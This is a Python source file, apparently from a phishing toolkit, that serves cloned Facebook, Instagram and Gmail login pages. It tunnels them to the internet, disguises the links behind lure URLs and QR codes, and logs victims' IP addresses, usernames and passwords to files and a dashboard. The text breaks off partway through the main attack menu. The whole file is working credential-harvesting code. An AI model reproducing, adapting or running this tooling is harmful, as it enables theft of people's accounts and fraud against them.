#!/usr/bin/env python3
import os
import sys
import time
import shutil
import urllib.request
import subprocess
import signal
import platform
import zipfile
import tarfile
import re
import json
import threading
import random

try:
    import qrcode
    import database
    from lib import ai_assistant
    from lib import site_injector
    from lib.terminal_ui import *
    from lib.network import *
except ImportError as e:
    _missing = str(e).split("'")
    _missing = _missing[-2] if len(_missing) >= 2 else str(e)
    print(f"\n\033[1;38;2;255;50;50m[!] Missing dependency: {_missing}\033[0m")
    print(
        "\033[1;38;2;30;144;255m[*] To install all dependencies, run ONE of the following:\033[0m"
    )
    print(
        "\033[1;38;2;0;255;255m    Windows      : pip install -r requirements.txt\033[0m"
    )
    print(
        "\033[1;38;2;0;255;255m    Linux/macOS  : pip3 install -r requirements.txt\033[0m"
    )
    print(
        "\033[1;38;2;0;255;255m    Kali/Debian  : pip3 install -r requirements.txt --break-system-packages\033[0m"
    )
    print(
        "\033[1;38;2;0;255;255m    Termux       : pip install -r requirements.txt\033[0m"
    )
    sys.exit(1)

if sys.stdout.encoding != "utf-8":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except AttributeError:
        pass

try:
    sys.stdin.reconfigure(encoding="utf-8", errors="replace")
except AttributeError:
    pass

# Global session variables
BASE_DIR = os.path.dirname(os.path.realpath(__file__))
HOST = "127.0.0.1"
PORT = "8080"

website = "Unknown"
mask = ""
monitoring_thread = None
stop_monitoring = threading.Event()
last_captured_ip = ""
qr_counter = 0


def sig_handler(sig, frame):
    print(f"\n\n{DARK}[{WHITE}!{DARK}]{DARK} Program Interrupted.")
    reset_color()
    sys.exit(0)


signal.signal(signal.SIGINT, sig_handler)
signal.signal(signal.SIGTERM, sig_handler)


def generate_qr(url):
    global qr_counter
    qr_counter += 1
    slow_type(
        f"    [+] Initializing Tactical QR Engine...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_PURPLE,
    )
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=5,  # Reduced size
            border=2,  # Reduced border
        )
        qr.add_data(url)
        qr.make(fit=True)
        qr_dir = os.path.join(BASE_DIR, "qrcodes")
        os.makedirs(qr_dir, exist_ok=True)
        img = qr.make_image(fill_color="black", back_color="white")
        qr_path = os.path.join(qr_dir, f"qr_code_{qr_counter}.png")
        img.save(qr_path)
        slow_type(
            f"    [+] Intelligence QR Secured at: qr_code_{qr_counter}.png",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )
        slow_type(
            f"    [!] QR Code for Scanning Ready:",
            speed=0.01,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        print()
        qr.print_ascii(tty=True)
        print()
    except Exception as e:
        print(f"\n{DARK}[{WHITE}!{DARK}]{PINK} Error generating QR Code: {e}{LIGHT1}")


def cusport():
    global PORT
    print()
    ans = slow_input(
        f"    [?] Do You Want A Custom Port [y/N]: ",
        start_rgb=(255, 215, 0),
        end_rgb=RGB_WHITE,  # Gold to White for Questions
    )
    if ans.lower() == "y":
        print("\n")
        cu_p = slow_input(
            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Custom 4-digit Port [1024-9999] : {LIGHT1}",
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )
        if cu_p.isdigit() and 1024 <= int(cu_p) <= 9999:
            PORT = cu_p
            print()
        else:
            print(
                f"\n\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid 4-digit Port : {cu_p}, Try Again...{LIGHT1}"
            )
            time.sleep(2)
            os.system("cls" if os.name == "nt" else "clear")
            banner_small()
            cusport()
    else:
        slow_type(
            f"    [+] Deploying on Default Port {PORT}...",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )


def setup_site():
    global stop_monitoring
    stop_monitoring.set()  # Stop any background monitoring from previous attack
    slow_type(
        f"    [+] Configuring Tactical Server Environment...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_AZURE,
    )
    site_dir = os.path.join(BASE_DIR, ".sites", website)
    www_dir = os.path.join(BASE_DIR, ".server/www")

    if not os.path.isdir(site_dir):
        print(
            f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} Error: Site directory {website} not found!"
        )
        return

    for item in os.listdir(site_dir):
        s = os.path.join(site_dir, item)
        d = os.path.join(www_dir, item)
        if os.path.isdir(s):
            shutil.copytree(s, d, dirs_exist_ok=True)
        else:
            shutil.copy2(s, d)

    shutil.copy2(
        os.path.join(BASE_DIR, ".sites/ip.php"), os.path.join(www_dir, "ip.php")
    )

    # Inject Phase 1 Features (Fingerprinting and Custom Post-Login Alerts)
    try:
        site_injector.inject_features(www_dir)
        slow_type(
            f"    [+] Advanced Fingerprinting & Alerts Injected...",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_PURPLE,
        )
    except Exception as e:
        print(
            f"    {DARK}[{PINK}!{DARK}]{PINK} Warning: Could not inject advanced features: {e}"
        )

    php_bin = shutil.which("php") or shutil.which("php.exe")
    if not php_bin:
        print(
            f"\n    {DARK}\x5b{PINK}!{DARK}\x5d{PINK} PHP binary lost! Re-check your installation."
        )
        sys.exit(1)

    slow_type(
        f"    [+] Initializing PHP Server Core...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    php_log = os.path.join(BASE_DIR, ".server/.php.log")
    with open(php_log, "w") as log:
        subprocess.Popen(
            [php_bin, "-S", f"{HOST}:{PORT}", "-t", www_dir],
            stdout=log,
            stderr=log,
        )


def capture_ip(silent=False):
    global website
    ip_file = os.path.join(BASE_DIR, ".server/www/ip.txt")
    if os.path.exists(ip_file):
        with open(ip_file, "r") as f:
            lines = f.readlines()
        ip = ""
        for line in lines:
            if "IP: " in line:
                ip = line.split("IP: ")[1].strip()

        if not silent:
            slow_type(
                f"\n    [+] CONNECTION: VICTIM IP TRACKED !!",
                speed=0.01,
                start_rgb=RGB_PURPLE,
                end_rgb=RGB_CYAN,
            )
            print(
                f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            print(f"    {LIGHT2}Victim IP : {WHITE}{ip}")
            print(f"    {LIGHT2}Log File  : {LIGHT1}auth/ip.txt")
            print(
                f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )

        auth_dir = os.path.join(BASE_DIR, "auth")
        if not os.path.exists(auth_dir):
            os.makedirs(auth_dir)

        auth_ip_file = os.path.join(auth_dir, "ip.txt")
        with open(auth_ip_file, "a") as f:
            f.writelines(lines)

        # Clear line and push down for clean display over input()
        print("\r\033[K", end="")
        print(
            f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
        )
        slow_type(
            f"    [+] INFILTRATION DETECTED: {ip}",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_PURPLE,
        )
        print(
            f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
        )

        # Re-print prompt look-alike only if we interrupted a background input()
        if silent:
            print(
                f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
                end="",
                flush=True,
            )

        # Save to SQLite for Dashboard
        database.add_victim(website, "IP_ONLY", "N/A", ip)

        # Notify Dashboard
        try:
            urllib.request.urlopen(f"http://localhost:5000/api/refresh", timeout=1)
        except:
            pass


def capture_creds(silent=False):
    global website
    user_file = os.path.join(BASE_DIR, ".server/www/usernames.txt")
    if os.path.exists(user_file):
        with open(user_file, "r") as f:
            lines = f.readlines()
        account = ""
        password = ""
        for line in lines:
            if "Username:" in line:
                raw = line.split("Username:")[1].strip()
                if "Pass:" in raw:
                    raw = raw.split("Pass:")[0].strip()
                account = raw
            if "Pass:" in line:
                password = line.split("Pass:")[-1].strip()

        # Extract IP from ip.txt if available, else N/A
        ip = "Unknown"
        auth_ip_file = os.path.join(BASE_DIR, "auth/ip.txt")
        if os.path.exists(auth_ip_file):
            with open(auth_ip_file, "r") as f:
                last_lines = f.readlines()[-5:]
                for l in last_lines:
                    if "IP: " in l:
                        ip = l.split("IP: ")[1].strip()

        if not silent:
            slow_type(
                f"\n    [!] SUCCESS: CREDENTIALS CAPTURED !!",
                speed=0.02,
                start_rgb=RGB_PINK,
                end_rgb=RGB_CYAN,
            )
            print(
                f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )
            print(f"    {LIGHT2}Account  : {WHITE}{account}")
            print(f"    {LIGHT2}Password : {WHITE}{password}")
            print(f"    {LIGHT2}IP Addr  : {WHITE}{ip}")
            print(
                f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            )

        auth_dir = os.path.join(BASE_DIR, "auth")
        if not os.path.exists(auth_dir):
            os.makedirs(auth_dir)

        auth_creds_file = os.path.join(auth_dir, "usernames.dat")
        with open(auth_creds_file, "a") as f:
            f.writelines(lines)

        # Clear line and push down for clean display over input()
        print("\r\033[K", end="")
        print(
            f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PINK, RGB_CYAN)}"
        )
        slow_type(
            f"    [!] INTEL SECURED: {account} | {password}",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_PINK,
        )
        print(
            f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PINK)}"
        )

        # Re-print prompt look-alike only if we interrupted a background input()
        if silent:
            print(
                f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
                end="",
                flush=True,
            )

        database.add_victim(website, account, password, ip)

        # Notify Dashboard
        try:
            urllib.request.urlopen(f"http://localhost:5000/api/refresh", timeout=1)
        except:
            pass


def capture_data(silent=False):
    global stop_monitoring
    stop_monitoring.clear()
    ip_file = os.path.join(BASE_DIR, ".server/www/ip.txt")
    user_file = os.path.join(BASE_DIR, ".server/www/usernames.txt")

    if not silent:
        wait_msg = "    [*] Waiting for Login Info... [ Ctrl + C to exit ]"
        print("\n" + gradient_text(wait_msg, RGB_BLUE, RGB_WHITE))
    try:
        while not stop_monitoring.is_set():
            if os.path.exists(ip_file):
                # Only capture if it's a new IP or different from last one to avoid spam
                with open(ip_file, "r") as f:
                    content = f.read()
                    current_ip = ""
                    if "IP: " in content:
                        current_ip = content.split("IP: ")[1].split("\n")[0].strip()

                global last_captured_ip
                if current_ip != last_captured_ip:
                    capture_ip(silent=silent)
                    last_captured_ip = current_ip

                if os.path.exists(ip_file):
                    os.remove(ip_file)

            if stop_monitoring.is_set():
                break
            time.sleep(0.5)

            if os.path.exists(user_file):
                if not silent:
                    print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Login info Found !!")
                capture_creds(silent=silent)
                if os.path.exists(user_file):
                    os.remove(user_file)

            if stop_monitoring.is_set():
                break

            # Simple heartbeat for silent mode - removed \r to avoid prompt overlap
            if silent and int(time.time()) % 20 == 0:
                # Only print if not capturing
                pass

            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n\n    {DARK}[{WHITE}-{DARK}]{LIGHT1} Stopping monitoring...")
        time.sleep(1)
        return


def custom_mask():
    global mask
    time.sleep(0.5)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print()
    mask_op = slow_input(
        f"    [?] Do you want to change Mask URL? [y/N]: ",
        start_rgb=(255, 215, 0),
        end_rgb=RGB_WHITE,
    )
    print()
    if mask_op.lower() == "y":
        print(
            f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Enter your custom URL below {LIGHT2}({LIGHT2}Example: https://get-free-followers.com{LIGHT2})\n"
        )
        mask_url = input(f"{LIGHT1} ==> {LIGHT2}")
        if mask_url == "":
            mask_url = "https://"
        if mask_url.startswith("http") or mask_url.startswith("www"):
            mask = mask_url
            print(
                f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Using custom Masked Url :{PURPLE} {mask}"
            )
        else:
            print(
                f"\n{DARK}[{WHITE}!{DARK}]{LIGHT2} Invalid url type..Using the Default one.."
            )

    if website == "reels_video":
        print()
        target_op = slow_input(
            f"    [?] Do you want to set a Target Video URL to redirect to? [y/N]: ",
            start_rgb=(255, 215, 0),
            end_rgb=RGB_WHITE,
        )
        print()
        if target_op.lower() == "y":
            print(
                f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Enter the target video URL below {LIGHT2}({LIGHT2}Example: https://www.instagram.com/reel/XYZ{LIGHT2})\n"
            )
            global target_video_url
            target_video_url = input(f"{LIGHT1} ==> {LIGHT2}")
        else:
            target_video_url = ""


def custom_url(url):
    url = url.replace("http://", "").replace("https://", "")
    isgd = "https://is.gd/create.php?format=simple&url="
    shortcode = "https://api.shrtco.de/v2/shorten?url="
    tinyurl = "https://tinyurl.com/api-create.php?url="

    custom_mask()
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()

    processed_url = ""
    if "trycloudflare.com" in url or "loclx.io" in url:
        if site_stat(isgd):
            processed_url = shorten(isgd, url)
        elif site_stat(shortcode):
            processed_url = shorten(shortcode, url)
        else:
            processed_url = shorten(tinyurl, url)

        processed_url = processed_url.replace("http://", "").replace("https://", "")
        masked_url = f"{mask}@{processed_url}"
        processed_url = f"https://{processed_url}"
        url = f"https://{url}"
    else:
        url = "Unable to generate links. Try after turning on hotspot"
        processed_url = "Unable to Short URL"
        masked_url = ""

    if (
        website == "reels_video"
        and "target_video_url" in globals()
        and target_video_url
    ):
        import urllib.parse

        encoded_target = urllib.parse.quote(target_video_url)
        if url.startswith("http"):
            url += f"?target={encoded_target}"
        if processed_url.startswith("http"):
            processed_url += f"?target={encoded_target}"
        if masked_url != "":
            masked_url += f"?target={encoded_target}"

    slow_type(
        f"    [-] URL 1 : {url}", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_PURPLE
    )
    slow_type(
        f"    [-] URL 2 : {processed_url}",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if "Unable" not in processed_url:
        slow_type(
            f"    [-] URL 3 : {masked_url}",
            speed=0.01,
            start_rgb=RGB_WHITE,
            end_rgb=RGB_AZURE,
        )
        generate_qr(url)


def start_cloudflared():
    global monitoring_thread
    cld_log = os.path.join(BASE_DIR, ".server/.cld.log")
    if os.path.exists(cld_log):
        os.remove(cld_log)
    cusport()
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( {LIGHT2}http://{HOST}:{PORT} {PURPLE})"
    )
    loading_animation(2, "Initializing Server")
    setup_site()
    slow_type(
        f"    [+] Initializing Cloudflared Multi-Proxy Tunnel...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )

    cld_bin = os.path.join(
        BASE_DIR,
        ".server",
        "cloudflared.exe" if platform.system() == "Windows" else "cloudflared",
    )

    if platform.system() != "Windows" and os.path.exists(cld_bin):
        os.chmod(cld_bin, 0o755)

    with open(cld_log, "w") as log:
        subprocess.Popen(
            [cld_bin, "tunnel", "-url", f"{HOST}:{PORT}"], stdout=log, stderr=log
        )

    loading_animation(8, "Generating Tunnel Link")
    cldflr_url = ""
    if os.path.exists(cld_log):
        with open(cld_log, "r") as f:
            content = f.read()
            match = re.search(r"https://[-0-9a-z]*\.trycloudflare\.com", content)
            if match:
                cldflr_url = match.group(0)

    custom_url(cldflr_url)

    # Start background monitoring immediately
    stop_monitoring.clear()
    if not monitoring_thread or not monitoring_thread.is_alive():
        monitoring_thread = threading.Thread(
            target=capture_data, args=(True,), daemon=True
        )
        monitoring_thread.start()

    post_attack_menu()


def localxpose_auth():
    loclx_bin = os.path.join(
        BASE_DIR, ".server", "loclx.exe" if platform.system() == "Windows" else "loclx"
    )
    subprocess.Popen(
        [loclx_bin, "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1)

    auth_f = os.path.join(os.path.expanduser("~"), ".localxpose", ".access")
    os.makedirs(os.path.dirname(auth_f), exist_ok=True)

    status = subprocess.run(
        [loclx_bin, "account", "status"], capture_output=True, text=True
    )
    if "Error" in status.stdout or "Error" in status.stderr:
        print(
            f"\n\n{DARK}[{WHITE}!{DARK}]{PURPLE} Create an account on {LIGHT2}localxpose.io{PURPLE} & copy the token\n"
        )
        loading_animation(3, "Waiting for token")
        loclx_token = input(
            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Input Loclx Token :{LIGHT2} "
        )
        if not loclx_token:
            print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} You have to input Localxpose Token.")
            time.sleep(2)
            tunnel_menu()
        else:
            with open(auth_f, "w") as f:
                f.write(loclx_token)


def start_loclx():
    global monitoring_thread
    cusport()
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( {LIGHT2}http://{HOST}:{PORT} {PURPLE})"
    )
    loading_animation(2, "Initializing Server")
    setup_site()
    localxpose_auth()

    print("\n")
    opinion = input(
        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Change Loclx Server Region? {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]:{LIGHT2} "
    )
    loclx_region = "eu" if opinion.lower() == "y" else "us"
    slow_type(
        f"    [+] Launching LocalXpose Secure Tunnel...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_BLUE,
    )

    loclx_bin = os.path.join(
        BASE_DIR, ".server", "loclx.exe" if platform.system() == "Windows" else "loclx"
    )

    if platform.system() != "Windows" and os.path.exists(loclx_bin):
        os.chmod(loclx_bin, 0o755)

    loclx_log = os.path.join(BASE_DIR, ".server/.loclx")
    with open(loclx_log, "w") as log:
        subprocess.Popen(
            [
                loclx_bin,
                "tunnel",
                "--raw-mode",
                "http",
                "--region",
                loclx_region,
                "--https-redirect",
                "-t",
                f"{HOST}:{PORT}",
            ],
            stdout=log,
            stderr=log,
        )

    loading_animation(12, "Generating Tunnel Link")
    loclx_url = ""
    if os.path.exists(loclx_log):
        with open(loclx_log, "r") as f:
            content = f.read()
            match = re.search(r"[0-9a-zA-Z.]*\.loclx\.io", content)
            if match:
                loclx_url = match.group(0)

    custom_url(loclx_url)

    # Start background monitoring immediately
    stop_monitoring.clear()
    if not monitoring_thread or not monitoring_thread.is_alive():
        monitoring_thread = threading.Thread(
            target=capture_data, args=(True,), daemon=True
        )
        monitoring_thread.start()

    post_attack_menu()


def start_localhost():
    global monitoring_thread
    cusport()
    loading_animation(2, "Initializing Server")
    setup_site()
    time.sleep(1)
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    slow_type(
        f"    [+] Successfully Hosted at : http://{HOST}:{PORT}",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )

    # Start background monitoring immediately
    stop_monitoring.clear()
    if not monitoring_thread or not monitoring_thread.is_alive():
        monitoring_thread = threading.Thread(
            target=capture_data, args=(True,), daemon=True
        )
        monitoring_thread.start()

    post_attack_menu()


def tunnel_menu():
    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    print(f"""
    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Localhost
    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Cloudflared  {DARK}\x5b{LIGHT2}Auto Detects{DARK}\x5d
    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} LocalXpose   {DARK}\x5b{LIGHT2}NEW! Max 15Min{DARK}\x5d
    """)
    reply = slow_input(
        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select a port forwarding service : {MEDIUM}{BOLD} ",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if reply in ["1", "01"]:
        start_localhost()
    elif reply in ["2", "02"]:
        start_cloudflared()
    elif reply in ["3", "03"]:
        start_loclx()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        tunnel_menu()


def site_facebook():
    global website, mask
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Advanced Voting Poll Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} Fake Security Login Page
{DARK}[{WHITE}04{DARK}]{LIGHT2} Facebook Messenger Login Page
""")
    reply = slow_input(
        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if reply in ["1", "01"]:
        website = "facebook"
        mask = "https://blue-verified-badge-for-facebook-free"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "fb_advanced"
        mask = "https://vote-for-the-best-social-media"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "fb_security"
        mask = "https://make-your-facebook-secured-and-free-from-hackers"
        tunnel_menu()
    elif reply in ["4", "04"]:
        website = "fb_messenger"
        mask = "https://get-messenger-premium-features-free"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_facebook()


def site_instagram():
    global website, mask
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Traditional Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Auto Followers Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} 1000 Followers Login Page
{DARK}[{WHITE}04{DARK}]{LIGHT2} Blue Badge Verify Login Page
""")
    reply = slow_input(
        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if reply in ["1", "01"]:
        website = "instagram"
        mask = "https://get-unlimited-followers-for-instagram"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "ig_followers"
        mask = "https://get-unlimited-followers-for-instagram"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "insta_followers"
        mask = "https://get-1000-followers-for-instagram"
        tunnel_menu()
    elif reply in ["4", "04"]:
        website = "ig_verify"
        mask = "https://blue-badge-verify-for-instagram-free"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_instagram()


def site_gmail():
    global website, mask
    print(f"""
{DARK}[{WHITE}01{DARK}]{LIGHT2} Gmail Old Login Page
{DARK}[{WHITE}02{DARK}]{LIGHT2} Gmail New Login Page
{DARK}[{WHITE}03{DARK}]{LIGHT2} Advanced Voting Poll
""")
    reply = slow_input(
        f"{DARK}[{WHITE}-{DARK}]{PURPLE} Select an option : {MEDIUM}",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )
    if reply in ["1", "01"]:
        website = "google"
        mask = "https://get-unlimited-google-drive-free"
        tunnel_menu()
    elif reply in ["2", "02"]:
        website = "google_new"
        mask = "https://get-unlimited-google-drive-free"
        tunnel_menu()
    elif reply in ["3", "03"]:
        website = "google_poll"
        mask = "https://vote-for-the-best-social-media"
        tunnel_menu()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        os.system("cls" if os.name == "nt" else "clear")
        banner_small()
        site_gmail()


def show_dashboard_info(from_attack=False):
    global monitoring_thread, stop_monitoring
    is_running = False
    try:
        import socket
        s = socket.socket()
        s.settimeout(1)
        result = s.connect_ex(('localhost', 5000))
        s.close()
        is_running = (result == 0)
    except Exception:
        pass

    os.system("cls" if os.name == "nt" else "clear")
    banner_small()
    status_label = f"{WHITE}LIVE ✓{RESET}" if is_running else f"{RED}NOT RUNNING ✗{RESET}"
    print(f"""
    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    {DARK}[{WHITE}+{DARK}]{LIGHT1} Web Dashboard Status: {status_label}
    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    {DARK}[{WHITE}-{DARK}]{LIGHT2} Local URL   : {WHITE}http://localhost:5000
    {DARK}[{WHITE}-{DARK}]{LIGHT2} Network URL : {WHITE}http://0.0.0.0:5000

    {DARK}[{WHITE}-{DARK}]{MEDIUM} Opening dashboard in your default browser...
    {DARK}[{WHITE}-{DARK}]{MEDIUM} The dashboard runs continuously in the background.

    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """)

    if is_running:
        import webbrowser
        webbrowser.open("http://localhost:5000")
        slow_type(f"    [+] Dashboard opened in browser!", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)
    else:
        slow_type(f"    [!] Dashboard not running. Restarting...", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_RED)
        start_dashboard()
        time.sleep(3)
        import webbrowser
        webbrowser.open("http://localhost:5000")
        slow_type(f"    [+] Dashboard restarted and opened!", speed=0.01, start_rgb=RGB_WHITE, end_rgb=RGB_CYAN)

    if from_attack:
        print(f"    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Return to Main Menu")
        print(
            f"    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Wait for Credentials (Terminal)"
        )
        print(
            f"    {PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        ans = slow_input(
            f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )

        if ans in ["2", "02"]:
            # Stop background thread and switch to foreground
            stop_monitoring.set()
            if monitoring_thread:
                monitoring_thread.join(timeout=1)
            stop_monitoring.clear()
            capture_data(silent=False)
            return
        else:
            return
    else:
        input(
            f"    {DARK}[{WHITE}Enter{DARK}]{LIGHT2} Press Enter to return to Main Menu..."
        )
        return


def post_attack_menu():
    global monitoring_thread, stop_monitoring
    while True:
        print(
            f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━ OPERATIONAL CONTROL CENTER ━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
        )
        print(
            f"    {DARK}╟ {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Synchronize Core (Main Menu)"
        )
        print(
            f"    {DARK}╟ {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} View Intelligence (Web Dashboard)"
        )
        print(
            f"    {DARK}╟ {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Live Tactical Feed (Terminal Capture)"
        )
        print(
            f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
        )

        reply = slow_input(
            f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )

        if reply in ["1", "01"]:
            # Monitoring is already running in background
            slow_type(
                f"    [+] Synchronizing Core... Returning to Tactical Command.",
                speed=0.01,
                start_rgb=RGB_WHITE,
                end_rgb=RGB_PURPLE,
            )
            time.sleep(1)
            main_menu()
            break
        elif reply in ["2", "02"]:
            # Start silent monitoring in background and show dashboard info
            stop_monitoring.clear()
            if not monitoring_thread or not monitoring_thread.is_alive():
                monitoring_thread = threading.Thread(
                    target=capture_data, args=(True,), daemon=True
                )
                monitoring_thread.start()
            show_dashboard_info(from_attack=True)
        elif reply in ["3", "03"]:
            # Switch to foreground monitoring
            stop_monitoring.set()
            if monitoring_thread:
                monitoring_thread.join(timeout=1)
            stop_monitoring.clear()
            capture_data(silent=False)
        else:
            print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
            time.sleep(1)


def main_menu():
    global website, mask
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    header = " [::] Select An Attack For Your Victim [::] "
    glitch_print(header, duration=0.4, start_rgb=RGB_CYAN, end_rgb=RGB_WHITE)
    print(f"""
    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Facebook      {DARK}\x5b{WHITE}06{DARK}\x5d{LIGHT2} Paypal        {DARK}\x5b{WHITE}11{DARK}\x5d{LIGHT2} Spotify
    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Instagram     {DARK}\x5b{WHITE}07{DARK}\x5d{LIGHT2} Snapchat      {DARK}\x5b{WHITE}12{DARK}\x5d{LIGHT2} Reddit
